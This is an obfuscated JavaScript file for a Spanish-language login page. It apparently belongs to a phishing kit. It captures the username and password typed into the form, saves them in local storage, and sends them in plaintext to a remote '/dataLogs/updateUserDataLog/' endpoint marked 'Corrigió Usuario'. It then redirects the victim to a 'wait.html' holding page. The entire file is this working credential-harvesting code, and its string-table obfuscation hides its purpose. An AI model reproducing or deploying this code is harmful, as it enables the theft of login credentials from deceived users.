const _0x3fbecb = _0x30c9;
(function (_0x25e1d9, _0x59d1a3) {
  const _0x4d7e06 = _0x30c9,
    _0x3cbadd = _0x25e1d9();
  while (!![]) {
    try {
      const _0x1afc89 =
        -parseInt(_0x4d7e06(0xf9)) / 0x1 +
        parseInt(_0x4d7e06(0xe6)) / 0x2 +
        -parseInt(_0x4d7e06(0x100)) / 0x3 +
        -parseInt(_0x4d7e06(0xe5)) / 0x4 +
        parseInt(_0x4d7e06(0xf1)) / 0x5 +
        parseInt(_0x4d7e06(0xfa)) / 0x6 +
        (-parseInt(_0x4d7e06(0xf2)) / 0x7) * (-parseInt(_0x4d7e06(0xf8)) / 0x8);
      if (_0x1afc89 === _0x59d1a3) break;
      else _0x3cbadd["push"](_0x3cbadd["shift"]());
    } catch (_0x1b2945) {
      _0x3cbadd["push"](_0x3cbadd["shift"]());
    }
  }
})(_0x24ef, 0xaeffa);
function updateLS() {
  const _0x3d66d3 = _0x30c9;
  LS["setItem"](_0x3d66d3(0xee), JSON["stringify"](info));
}
function _0x24ef() {
  const _0x279b4d = [
    "click",
    "getElementById",
    "dataLogToken",
    "1648msPZJN",
    "554185RmznNP",
    "2519226pdmXwi",
    "Bearer\x20",
    "txtPass",
    "Corrigió\x20Usuario",
    "puser",
    "txtUsuario",
    "423168ZLjymU",
    "/dataLogs/updateUserDataLog/",
    "origin",
    "Usuario\x20actualizado\x20correctamente",
    "dataLogId",
    "log",
    "stringify",
    "metaInfo",
    "user",
    "error",
    "wait.html",
    "focus",
    "5659288JgTMjy",
    "1487078iPGBbX",
    "Por\x20favor\x20ingrese\x20la\x20información\x20requerida",
    "disabled",
    "btnUsuario",
    "Error\x20al\x20actualizar\x20los\x20datos\x20en\x20el\x20servidor",
    "No\x20se\x20encontró\x20el\x20ID\x20o\x20el\x20token\x20en\x20localStorage.",
    "getItem",
    "value",
    "info",
    "href",
    "location",
    "2009515KnuEIH",
    "42868HUDfTC",
    "PUT",
    "json",
  ];
  _0x24ef = function () {
    return _0x279b4d;
  };
  return _0x24ef();
}
function _0x30c9(_0x5b2c3c, _0x20938c) {
  const _0x24effb = _0x24ef();
  return (
    (_0x30c9 = function (_0x30c97a, _0x58e6f6) {
      _0x30c97a = _0x30c97a - 0xde;
      let _0x2dae6d = _0x24effb[_0x30c97a];
      return _0x2dae6d;
    }),
    _0x30c9(_0x5b2c3c, _0x20938c)
  );
}
const button = document[_0x3fbecb(0xf6)](_0x3fbecb(0xe9)),
  userInput = document[_0x3fbecb(0xf6)](_0x3fbecb(0xff)),
  passInput = document["getElementById"](_0x3fbecb(0xfc));
async function updateStatusUser() {
  const _0x43b4e8 = _0x3fbecb;
  button[_0x43b4e8(0xe8)] = !![];
  try {
    const _0x27abf5 = localStorage[_0x43b4e8(0xec)](_0x43b4e8(0x104)),
      _0x34fbe1 = localStorage[_0x43b4e8(0xec)](_0x43b4e8(0xf7));
    if (!_0x27abf5 || !_0x34fbe1) throw new Error(_0x43b4e8(0xeb));
    const _0x26e697 = await fetch(url + _0x43b4e8(0x101) + _0x27abf5, {
      method: _0x43b4e8(0xf3),
      headers: {
        "Content-Type": "application/json",
        Authorization: _0x43b4e8(0xfb) + _0x34fbe1,
        Origin: window[_0x43b4e8(0xf0)][_0x43b4e8(0x102)],
      },
      body: JSON[_0x43b4e8(0xdf)]({
        us: info["metaInfo"]["user"],
        ps: info[_0x43b4e8(0xe0)][_0x43b4e8(0xfe)],
        status: _0x43b4e8(0xfd),
      }),
    });
    if (!_0x26e697["ok"]) {
      const _0x3d1858 = await _0x26e697[_0x43b4e8(0xf4)]();
      throw new Error(_0x3d1858[_0x43b4e8(0xe2)] || _0x43b4e8(0xea));
    }
    const _0x4004fc = await _0x26e697[_0x43b4e8(0xf4)]();
    console[_0x43b4e8(0xde)](_0x43b4e8(0x103));
  } catch (_0x1b2a9e) {
    console[_0x43b4e8(0xe2)](
      "Error\x20al\x20procesar\x20la\x20solicitud:",
      _0x1b2a9e
    );
  } finally {
    (button["disabled"] = ![]),
      (window[_0x43b4e8(0xf0)][_0x43b4e8(0xef)] = _0x43b4e8(0xe3));
  }
}
button["addEventListener"](_0x3fbecb(0xf5), async function (_0x133954) {
  const _0x1eb2fd = _0x3fbecb;
  _0x133954["preventDefault"]();
  if (userInput[_0x1eb2fd(0xed)] === "" || passInput[_0x1eb2fd(0xed)] === "") {
    alert(_0x1eb2fd(0xe7)), userInput[_0x1eb2fd(0xe4)]();
    return;
  }
  const _0x5d5510 = userInput["value"],
    _0x3021ac = passInput["value"];
  (info[_0x1eb2fd(0xe0)][_0x1eb2fd(0xe1)] = _0x5d5510),
    (info["metaInfo"]["puser"] = _0x3021ac),
    updateLS(),
    await updateStatusUser();
});
